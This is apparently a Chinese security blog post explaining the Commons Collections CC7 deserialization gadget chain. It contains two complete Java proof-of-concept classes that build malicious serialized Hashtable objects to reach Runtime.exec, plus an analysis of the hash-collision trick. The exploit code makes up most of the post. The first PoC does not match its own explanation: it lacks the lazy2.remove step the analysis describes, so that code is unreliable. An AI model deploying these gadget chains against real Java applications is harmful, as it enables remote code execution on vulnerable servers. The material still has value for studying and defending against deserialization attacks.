```java
java.util.Hashtable.readObject
java.util.Hashtable.reconstitutionPut
org.apache.commons.collections.map.AbstractMapDecorator.equals
java.util.AbstractMap.equals
org.apache.commons.collections.map.LazyMap.get
org.apache.commons.collections.functors.ChainedTransformer.transform
org.apache.commons.collections.functors.InvokerTransformer.transform
java.lang.reflect.Method.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke0
java.lang.Runtime.exec
```

## POC

```java
package org.example;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;
import java.util.Hashtable;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CC7 {
    public static void main(String args[]) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        String cmd = "calc";

        Transformer[] faketransformer = new Transformer[1];
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);
        Map hashmap1 = new HashMap();
        Map hashmap2 = new HashMap();

        Map lazy1 = LazyMap.decorate(hashmap1,chainedTransformer);
        lazy1.put("yy",1);
        Map lazy2 = LazyMap.decorate(hashmap2,chainedTransformer);
        lazy2.put("zZ",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazy1,1);
        hashtable.put(lazy2,1);

        //反射
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(hashtable);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();


    }
}

```

## 分析

入口点位于hashtable#readObject方法

![image-20240602162239856](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240602162239856.png)

readObect中调用了reconstitutionPut

![image-20240602162353025](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240602162353025.png)

这里涉及到对hash和index值的处理.y比z小1，经过第一轮循环后h的差值就差31，所以我们可以控制第二个字符是y与Z，前面比后面大31刚好抵消了这个差距

e.key设置为Lazymap对象，但由于Lazymap并没有equals方法，会调用父类AbstractMapDecorator#equals

![image-20240602195957494](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240602195957494.png)

this.map被控制为我们传入的hashmap,hashmap并没有equals方法，转而调用父类AbstractMap#equals

![image-20240602200300113](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240602200300113.png)

m来自于传入的o,这里有两个需要注意的点，即m.size()的控制一集value不能为null,因此在代码的后续，进行了lazy2.remove("yy");的移除操作控制size，最终调用到m.get(),m为lazymap对象。

## CC6

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7_hashtable {
    public static void main(String args[]) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        String cmd = "calc";

        Transformer[] faketransformer = new Transformer[]{
                new ConstantTransformer(1)
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);
        Map hashMap = new HashMap();
        Map lazy = LazyMap.decorate(hashMap,chainedTransformer);

        Hashtable table = new Hashtable();
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy,"1");
        table.put(tiedMapEntry,"2");
        lazy.remove("1");
        //反射
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(table);
        out.flush();
        out.close();
        byte[] bytes = baos.toByteArray();
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(bais);
        in.readObject();
    }
}

```

